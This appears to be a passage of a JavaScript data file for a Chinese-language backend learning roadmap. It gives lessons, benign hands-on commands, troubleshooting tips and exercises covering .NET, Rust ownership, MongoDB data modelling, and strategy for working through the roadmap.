      { title: '.NET 后端全景', content: '优势：\n1) 性能强——ASP.NET Core 在 Techempower 基准测试中稳居前十（和 Rust/C++ 框架同级别），远超 Django/Rails/Express\n2) LINQ——数据查询语言集成在语法层面：var adults = users.Where(u => u.Age >= 18).OrderBy(u => u.Name); 读起来像英文，编译时类型检查\n3) async/await——C# 5.0（2012 年）就引入了，比 JavaScript（2017 年 ES2017）早 5 年。实现模型优雅（Task-based）\n4) Entity Framework Core——成熟的 ORM，Code First（先写代码再生成数据库表）模式非常方便\n5) 强类型 + 编译检查 + 优秀的 IDE——Visual Studio / Rider 的智能提示和重构能力顶级\n6) .NET 8+ 的 Minimal API：var app = WebApplication.Create(); app.MapGet("/", () => "Hello"); app.Run()——4 行代码起 API，不再需要 Startup.cs\n\n劣势：\n1) 生态不如 Java/Node.js 广泛——虽然跨平台了，但市场占有率和第三方库数量还不够\n2) 开发者群体相对小——招聘 .NET 比招 Java/Node.js 更难（国内）\n3) 云原生生态不如 Go——K8s/Docker/Prometheus 都是 Go 写的\n4) 微软生态的历史包袱——虽然有 .NET Core，但很多老一辈对 .NET 的印象还停留在"Windows Only"\n\n适合：Windows 企业环境、游戏后端（Unity）、金融系统（高性能）、传统企业信息化\n国内：企业 .NET 岗位稳定但数量少，互联网公司基本不用' },
    ],
    handsOn: [
      { title: '用 .NET CLI 创建并运行一个最小 API', cmd: 'dotnet new webapi -n DemoApi -o /tmp/dotnet-demo --no-https 2>&1 && cd /tmp/dotnet-demo && dotnet run --urls "http://localhost:5000" &', output: 'Building...\ninfo: Microsoft.Hosting.Lifetime[14]\n      Now listening on: http://localhost:5000', explain: 'dotnet CLI 一键生成 Web API 项目。.NET 6+ 的 Minimal API 写法让代码量大幅减少——不再需要 Startup.cs 和复杂的配置类。Program.cs 里 var app = WebApplication.CreateBuilder(args).Build(); app.MapGet("/", () => "Hello World"); app.Run(); 就行。' },
    ],
    diagnosis: [
      { symptom: '.NET 应用部署到 Linux 后性能远不如 Windows', cause: '可能是 GC 模式不同（Windows 默认 Workstation GC，Linux 视配置可能不同）、文件系统差异、或依赖了 Windows 特有的 API（如 Windows Authentication）。', fix: '1) 检查 .csproj 中 ServerGarbageCollection 配置（Linux 服务器建议开启 Server GC）2) 用 dotnet-counters 监控 GC 行为 3) 确认没有使用 Windows-only API 4) 发布时用 dotnet publish -c Release -r linux-x64 --self-contained。' },
    ],
    exercises: [
      { level: '基础', task: '.NET Core 和 .NET Framework 最大的区别是什么？为什么这个区别重要？', hint: '运行平台', answer: '.NET Core（现统称 .NET 5+）是跨平台的——可以在 Linux/Mac/Windows 上运行。.NET Framework 只能运行在 Windows 上。这个区别意味着 .NET 不再被锁定在 Windows Server 生态中，可以部署在 Linux 容器中，大幅降低了部署成本并增加了灵活性。' },
      { level: '进阶', task: '用一个 LINQ 查询语句完成：从一个用户列表中选出年龄大于 18 的用户，按注册日期倒序排列，只取前 10 个，投影出姓名和邮箱', hint: '.Where().OrderByDescending().Take().Select()', answer: 'var result = users.Where(u => u.Age > 18).OrderByDescending(u => u.RegisteredAt).Take(10).Select(u => new { u.Name, u.Email });。这个链式调用和 SQL 的 WHERE + ORDER BY + LIMIT + SELECT 一一对应，但享受了编译时类型检查。' },
    ],
  },

  // ============================================================
  // 28. Rust / Rust
  // ============================================================
  "CWwh2abwqx4hAxpAGvhIx": {
    mentalModel: 'Rust 是"配了防滚架+五点式安全带+防火服的赛车"——性能媲美 C++（零成本抽象、无 GC 停顿），但编译器这个"最严格的安检员"在你上路之前就揪出所有安全隐患（内存泄漏、空指针、数据竞争）。代价是你得花几周时间和编译器"吵架"并学会它的规则。Rust 连续多年在 StackOverflow 调查中被评为"最受喜爱的语言"。',
    sections: [
      { title: 'Rust 的三大杀手特性', content: '1) 所有权系统（Ownership）——没有 GC 的内存安全\n   Rust 没有垃圾回收器（GC），也不需要手动 malloc/free。规则：\n   - 每个值有且只有一个"所有者"（owner）\n   - 所有者离开作用域，值被自动释放（drop）\n   - 赋值/传参会"转移所有权"（move）——原变量失效\n   - 可以通过"借用"（Borrow）来临时使用值而不获取所有权\n     - &T：不可变借用（可以同时存在多个）\n     - &mut T：可变借用（同一时间只能有一个，且不能和不可变借用共存）\n   - 编译器在编译时检查所有借贷关系——拒绝编译有问题的代码\n\n   这套系统消除了：use-after-free（释放后使用）、double-free（重复释放）、null-pointer（空指针——Rust 没有 null，用 Option）、data race（数据竞争）。\n\n2) 零成本抽象\n   高阶抽象（Iterator、Closure、Trait）编译后和手写的底层代码性能一致。你不会因为用了"高级写法"而损失性能。\n\n3) 模式匹配 + 代数类型\n   enum + match 的组合极其强大：\n   match result { Ok(data) => ..., Err(e) => ... }\n   编译器强制你处理所有可能情况——不会漏掉错误处理。\n   Option（Some/None）代替 null，Result（Ok/Err）代替异常。' },
      { title: 'Rust 在后端的实际使用', content: 'Rust 不是快速开发的"瑞士军刀"，而是性能关键路径上的"手术刀"。\n\n适合 Rust 的后端组件：\n- API 网关/代理（Cloudflare 用 Rust 重写了 Nginx C 模块——Pingora 项目，性能大幅提升）\n- 数据库驱动/连接池（性能要求极高且不能 crash）\n- 数据处理流水线（ETL 中性能敏感的环节）\n- WebAssembly 后端（Rust 编译到 WASM 的工具链最成熟）\n\n不适合 Rust 的场景：\n- 快速原型（所有权和生命周期太费时间）\n- 简单 CRUD API（杀鸡用牛刀——Go/Node.js 几分钟搞定的事 Rust 要写半天）\n- 团队还不熟悉 Rust（学习曲线会导致交付速度大幅下降）\n\n热门 Web 框架：\n- Actix-web：性能最强（Techempower 基准测试常年第一），但 API 较底层\n- Axum：Tokio 团队出品，更现代、更好用，推荐新手\n- Rocket：宏驱动，最"魔法"最易用（但 nightly Rust 限制慢慢放开）\n\n学习建议：不要作为第一门语言。先精通 Go/Python/Node.js 之一，理解内存管理的基本概念，再学 Rust 会事半功倍。' },
      { title: '所有权系统的直观理解——三个核心规则', content: '规则 1：每一个值都有一个所有者\nlet s = String::from("hello"); // s 是 "hello" 的所有者\nlet t = s; // 所有权从 s 转移（move）到 t\nprintln!("{}", s); // 编译错误！s 已经失效\n\n规则 2：同一时刻只能有一个可变引用或任意多个不可变引用\nlet mut v = vec![1, 2, 3];\nlet r1 = &v;      // 不可变借用\nlet r2 = &v;      // 可以多个不可变借用\nlet r3 = &mut v;  // 编译错误！已有不可变借用时不能有可变借用\n\n规则 3：引用必须总是有效的\nfn dangle() -> &String {\n    let s = String::from("hello");\n    &s  // 编译错误！s 在函数结束时被释放，返回的引用指向了已释放的内存\n}\n\n这三条规则在你写代码时由编译器强制执行。刚开始会觉得"编译器真烦人"，但当你发现它帮你避免了"半夜三点被叫起来修线上内存崩溃"时，你会爱上它的。' },
    ],
    diagnosis: [
      { symptom: 'Rust 编译时一堆 borrow checker 错误，改了一个又出新的', cause: '对所有权和借用规则理解不够——共享引用和可变引用冲突、生命周期标注不正确。', fix: '1) 仔细读编译器错误信息 2) 先用 .clone() 绕过所有权让代码跑起来，再逐步优化 3) 复杂场景先画所有权流转图。' },
      { symptom: 'Rust API 服务处理请求时偶尔 panic 导致进程退出', cause: '.unwrap() 或 .expect() 遇到了 None/Err——生产环境不应使用 unwrap。', fix: '1) 替换 .unwrap() 为 ? 操作符 + 错误传播 2) 不可避免的位置用 .expect("reason") 留线索 3) 启用 catch_unwind 做 panic 防护，记录日志后优雅恢复。' },
    ],
    exercises: [
      { level: '基础', task: '说出 Rust 相比 Go 最大的两个优势和一个最大的劣势', hint: '内存安全 / 性能 vs 学习曲线', answer: '优势：1) 更强内存安全保证（编译时检查所有权和生命周期，消除 null/use-after-free/double-free/数据竞争）2) 性能更强（零成本抽象、无 GC 停顿）。劣势：学习曲线陡得多——所有权/生命周期/借贷检查需要几周才能适应，开发速度慢。' },
      { level: '进阶', task: '理解 Rust 中 String 和 &str 的区别——什么时候用哪个？', hint: 'String 是拥有所有权的堆分配字符串，&str 是字符串切片（借用）', answer: 'String：拥有所有权、可变、存在堆上。适合创建/修改/拥有字符串的场合。&str：借用的字符串视图、不可变、可以是字面量（存在静态区）或 String 的切片。适合只读的函数参数（fn greet(name: &str) 能接受 &String 和字面量）。' },
    ],
  },

  // ============================================================
  // 29. MongoDB / MongoDB
  // ============================================================
  "28U6q_X-NTYf7OSKHjoWH": {
    mentalModel: 'MongoDB 像一个"文件袋"——每个 Document（文档）是一张纸，同一个袋里的纸可以格式完全不一样（Schema-less）。和 SQL 的"表格"（所有行的列都对齐）是两种截然不同的数据组织哲学。SQL 管的是整齐的仓库货架（结构固定），MongoDB 管的是灵活的档案袋（结构自由）。',
    sections: [
      { title: 'MongoDB 核心概念——和 SQL 的一一对应', content: 'SQL 概念 → MongoDB 概念：\n- Database → Database\n- Table → Collection\n- Row → Document（BSON 格式，类似 JSON 但多了日期/二进制等类型）\n- Column → Field\n- Primary Key → _id（默认 ObjectId，也可自定义）\n- JOIN → $lookup（聚合管道中的操作，但性能和 SQL JOIN 差距大）\n- Transaction → 多文档事务（4.0+ 支持，但性能不如单文档操作）\n\n关键差异：\n1) Schema-less：同一个 Collection 的文档可以有不同字段。写 {name:"张三",age:25} 和 {name:"李四",age:30,city:"北京"} 都在同一个 Collection 里。\n2) 嵌入式文档：一个文档中嵌入另一个文档。用户文档里直接包含地址信息——查询时不用 JOIN。\n3) 数组字段：文档中可以有数组。一篇文章的标签直接用数组存 ["Go","后端","并发"]。\n\n示例对比：\n\nSQL（需要两张表 + JOIN）：\nusers 表：id, name, email\naddresses 表：id, user_id, city, street\n查询用户+地址需要 JOIN\n\nMongoDB（嵌入）:\n{\n  _id: ObjectId("..."),\n  name: "张三",\n  email: "zhang@example.com",\n  addresses: [\n    { city: "北京", street: "长安街1号" },\n    { city: "上海", street: "南京路2号" }\n  ]\n}\n查询一次拿到所有数据。' },
      { title: 'MongoDB 的正确使用场景和常见坑', content: '适合 MongoDB 的场景：\n1) 内容管理——文章、评论、用户生成内容，字段多变，不同内容类型结构不同\n2) 用户画像——每个用户的标签、行为数据各不相同\n3) IoT/日志数据——写入量大、数据结构可能随设备版本变化\n4) 快速原型——Schema 迭代快，不用 ALTER TABLE\n5) 电商商品——不同品类（服装/电子/图书）属性完全不同，Schema-less 天然适配\n\n不适合 MongoDB 的场景：\n1) 多表关联查询——$lookup 性能远不如 SQL JOIN。如果你有大量关联查询，用 PostgreSQL\n2) 需要强 ACID 事务——MongoDB 4.0+ 支持多文档事务但性能差，不要频繁使用\n3) 需要严格数据一致性——Schema-less 意味"程序逻辑"承担了更多校验责任\n\n常见坑（新手 99% 会遇到）：\n\n坑 1：单个文档大小限制 16MB\n- 嵌入数组无限增长（如用户的浏览记录一直往文档里 push）→ 超过 16MB 写入失败\n- 解决：把无限增长的数组拆成独立 Collection 或用 GridFS\n\n坑 2：忘记建索引\n- MongoDB 默认只对 _id 建索引。查询其他字段没有索引就是全表扫描——数据量一大就慢到超时\n- 解决：为常用查询字段建索引（db.collection.createIndex({email: 1})）\n\n坑 3：以为 NoSQL = 不需要 Schema\n- Schema-less 不等于不需要设计！在代码层面你还是要定义数据结构\n- 用 Mongoose（Node.js ODM）定义 Schema 做校验，不要信任写入的随意数据\n\n坑 4：把 MongoDB 当 SQL 用\n- 大量 $lookup 和复杂的聚合管道 → 性能惨不忍睹\n- 重新设计数据模型——让数据以"查询一次就能拿到"的方式组织（嵌入代替关联）' },
    ],
    handsOn: [
      { title: 'MongoDB Shell 基本操作', cmd: `mongosh --quiet --eval '
use blog;
db.posts.insertOne({
  title: "MongoDB 入门",
  tags: ["database", "nosql"],
  author: { name: "张三", email: "zhang@example.com" },
  comments: [
    { user: "李四", text: "好文章!", createdAt: new Date() }
  ]
});
print("\\n插入的文档：");
printjson(db.posts.findOne({}, {title:1, tags:1, "author.name":1}));
'`, output: '插入的文档：\n{\n  _id: ObjectId("..."),\n  title: "MongoDB 入门",\n  tags: ["database", "nosql"],\n  author: { name: "张三" }\n}', explain: '注意文档中嵌套了 author 对象和 comments 数组。这在 SQL 中需要 users 表 + posts 表 + comments 表三张表 JOIN。MongoDB 一个文档包含了所有相关数据，一次查询拿到。' },
    ],
    diagnosis: [
      { symptom: 'MongoDB 写入越来越慢，偶尔超时', cause: '文档中可能有不断增长的数组（如日志/历史记录），文档膨胀到几 MB。或缺少索引导致全表扫描阻塞了写入。', fix: '1) 检查大文档：db.collection.stats().avgObjSize 2) 无限增长的数组拆到独立 Collection 3) 用 db.currentOp() 检查是否有长时间运行的查询阻塞写入。' },
      { symptom: '查询某个字段很慢，explain 显示 COLLSCAN（全表扫描）', cause: '没有为查询的字段建索引。MongoDB 的 _id 是唯一默认索引。', fix: '1) 建索引：db.collection.createIndex({email: 1}) 2) 检查查询是否用到了索引：db.collection.find({email: "test@test.com"}).explain("executionStats") 看 winningPlan 中是否 IXSCAN。' },
      { symptom: '副本集 Secondary 节点延迟越来越大', cause: 'Primary 写入量大，Secondary 的 oplog 回放跟不上。或 Secondary 节点硬件配置比 Primary 差。', fix: '1) 检查 oplog 窗口：rs.printReplicationInfo() 2) 增大 oplog 大小 3) Secondary 硬件配置不要低于 Primary 4) 检查是否有长时间运行的操作阻塞了 oplog 回放。' },
    ],
    exercises: [
      { level: '基础', task: '设计一个博客系统的 MongoDB 数据模型——写出 Post 文档的结构（包含作者信息、标签、评论）', hint: '用嵌套代替关联——作者信息、标签、评论都嵌入在 Post 文档中', answer: '{ _id, title, content, author: { name, email, avatar }, tags: ["tech","js"], comments: [{ user, text, createdAt }], createdAt, updatedAt }。一次查询拿到文章+作者+评论，不需要 JOIN。但如果评论数可能成千上万，应该把评论拆分到独立 Collection。' },
      { level: '进阶', task: '对比设计：同样是博客系统，分别用 SQL（PostgreSQL）和 MongoDB 设计数据模型，说出各自的优劣', hint: 'SQL 用三张表 + JOIN，MongoDB 用嵌套文档', answer: 'SQL：users/posts/comments 三张表，外键关联。优点：数据一致性强、评论独立易管理。缺点：查文章需要 JOIN 三张表。MongoDB：评论嵌入 post 文档。优点：查文章一次搞定。缺点：评论数多时文档巨大、难以分页查看评论、删除用户时需更新所有 post。' },
    ],
  },

  // ============================================================
  // 30. 详细版路线图与其他相关路线
  // ============================================================
  "yHmHXymPNWwu8p1vvqD3o": {
    mentalModel: '路线图就像一张地铁线路图——你现在在"新手站"（红色线起点），目标是"高级后端工程师站"（橙色线终点）。不同颜色的线路代表不同的学习路径（语言线/数据库线/运维线），交汇站是"综合项目"——在这里换乘能检验你之前的积累。有些站标了"了解即可"（快速通过），有些标了"必须精通"（深度停留）。',
    sections: [
      { title: '如何使用这张路线图——策略比勤奋更重要', content: '错误方式（90% 新手会犯）：\n- 从左上角第一个节点开始，按顺序学，不学完不往下走\n- 每个节点都追求"学透"（比如花一周学 HTTP 缓存的所有细节）\n- 学了 3 个月还没写过一行 API 代码\n\n正确方式（两遍法）：\n\n第一遍：快速浏览（2-3 周）\n- 每个节点花 15-30 分钟快速了解："这是什么？为什么需要它？什么时候用？"\n- 不需要深入细节，不需要记忆，只需要建立"知识地图"\n- 目标：知道"山上有哪些东西"，以后查资料知道搜什么关键词\n\n第二遍：项目驱动深度学（持续进行）\n- 做项目遇到某个技术 → 回到路线图找对应节点 → 深入学习\n- 例如：做博客项目要加登录功能 → 回到"认证"节点 → 学 JWT → 实现 → 真正理解\n- 这种方式学到的是"有用的知识"，不是"可能用到的知识"\n\n优先级公式：\n核心路径（必须精通 80%+）：语言基础 → Git → 数据库（SQL） → API 开发 → 认证授权 → 一个完整项目\n扩展路径（了解 20% 即可）：各种数据库类型对比 → 消息队列 → 容器 → 微服务 → 系统设计\n\n核心原则：让项目需求引领学习方向，而不是按路线图顺序死磕。' },
      { title: '路线图的局限性——它告诉你要学什么，但不告诉你要学多深', content: '路线图是一个"清单"，不是"教材"。它告诉你后端工程师需要知道哪些东西，但不告诉你：\n\n1) 每个节点要学到什么深度\n   - 标记 "了解"：能解释概念、知道使用场景 → 15 分钟\n   - 标记 "熟悉"：能独立使用、知道常见坑 → 2-4 小时\n   - 标记 "精通"：能深入原理、优化性能、教别人 → 做 1-2 个相关项目\n\n2) 节点之间的依赖关系\n   - 你要学了 Git 才能协作\n   - 你要学了 SQL 才能做数据库操作\n   - 但你不必学了 Docker 才学 API（可以手动部署，Docker 是锦上添花）\n\n3) 知识的老化\n   - HTTP/2、TLS 1.3、ES2024 等都是近年更新的\n   - 路线图定期更新（从 roadmap.sh 同步），但具体技术的细节要自己查最新文档\n\n4) 实践空白的填补\n   - 路线图上没有"做项目"这个节点，但它是最重要的\n   - 路线图上没有"排错技巧"，但它是日常工作 50% 的内容\n   - 路线图上没有"软技能"（沟通、Code Review、文档），但它们决定你能走多远\n\n建议：把路线图当作体检单——定期回看，标记自己达到什么水平，发现盲区后制定下一阶段学习计划。' },
      { title: '横向扩展——当核心路线稳固后', content: '当你完成了核心路线（语言+数据库+API+项目），可以考虑横向扩展：\n\n方向 1：数据工程深度\nPostgreSQL 深入 + Redis + MongoDB + Elasticsearch + 数据仓库\n适合：对数据存储和处理感兴趣\n\n方向 2：基础设施和运维\nLinux + Docker + Kubernetes + Terraform + CI/CD + 监控\n适合：对"代码怎么跑在生产环境"感兴趣\n\n方向 3：架构和系统设计\n微服务 + 消息队列 + API 网关 + 分布式系统 + 领域驱动设计\n适合：想成为架构师\n\n方向 4：安全\nOWASP Top 10 + 加密学 + 渗透测试 + 合规\n适合：对安全攻防感兴趣\n\n方向 5：全栈\nReact/Vue + TypeScript + SSR/SSG + 移动端\n适合：想独立完成产品\n\n注意：排序有先后——先把核心路线走扎实（能独立做完整项目），再选择 1-2 个方向横向扩展。不要同时扩展所有方向——那是成为"样样通、样样松"的最快途径。' },
    ],
    diagnosis: [
      { symptom: '按路线图学了 6 个月，面试时被问项目遇到的技术难点答不上来', cause: '路线图告诉要学什么但没告诉要在项目中练什么——理论和实践脱节。', fix: '1) 每学 3-5 个节点就做一个对应的项目练习 2) 记录项目中的技术决策和踩坑经验 3) 把路线图当体检单定期回顾标记盲区。' },
      { symptom: '面对路线图上 150+ 个节点感到焦虑不知道该从哪里开始', cause: '把路线图当必须全部学完的清单而非导航地图。', fix: '1) 两遍法：第一遍快速浏览 2-3 周，第二遍项目驱动 2) 优先级排序：语言 > 数据库 > API > 一个项目 > 其他 3) 允许有些节点目前不需要。' },
    ],
    exercises: [
      { level: '基础', task: '拿出纸笔（或用绘图工具），画出你未来 3 个月的学习路线图——基于你现在的位置，标记 10 个你最想学的节点并排序', hint: '不要太贪心，3 个月最多深入学 5-8 个节点', answer: '示例：第 1 个月：Go 基础语法 + HTTP 深入 + Git 熟练使用。第 2 个月：PostgreSQL 基础 + CRUD API + JWT 认证。第 3 个月：做一个完整项目（博客或任务管理）+ Docker 部署。顺序考虑依赖关系——先学 Git 才能管代码，先学数据库才能做项目。' },
      { level: '进阶', task: '找一个你感兴趣的开源后端项目（如 Express/FastAPI/Gin），阅读它的源码结构，对照路线图找出它用到了哪些节点', hint: '从项目根目录结构开始，看它怎么组织路由/数据库/中间件/配置', answer: '例如看 Express.js 源码：路由系统用到了 HTTP 方法/路径匹配（HTTP 节点）、中间件机制用到了责任链模式（软件架构节点）、Request/Response 封装用到了流式处理。把看到的每个技术点对应到路线图上一个节点——这样理论和实践就连接起来了。' },
      { level: '挑战', task: '为自己设定一个"3 个月后端学习里程碑"：目标状态是"能独立完成一个带认证、数据库、缓存、部署的全栈项目"。列出详细的里程碑检查点', hint: 'SMART 目标：Specific, Measurable, Achievable, Relevant, Time-bound', answer: '月 1 周 1-2：完成语言基础（变量/函数/控制流/结构体/接口）→ 检查：写 5 个小练习代码。月 1 周 3-4：Git 熟练 + HTTP 深入 → 检查：用 curl 测试 10 种不同状态码。月 2 周 1-2：数据库 CRUD → 检查：建 5 张表并写 20 条不同查询。月 2 周 3-4：实现博客 API → 检查：所有 CRUD 端点 curl 测试通过。月 3 周 1-2：加 JWT 认证 + Redis 缓存 → 检查：带 Token 请求、缓存命中/未命中。月 3 周 3-4：Docker 部署 + CI → 检查：docker-compose up 一键启动、push 自动跑测试。' },
    ],
  },
};
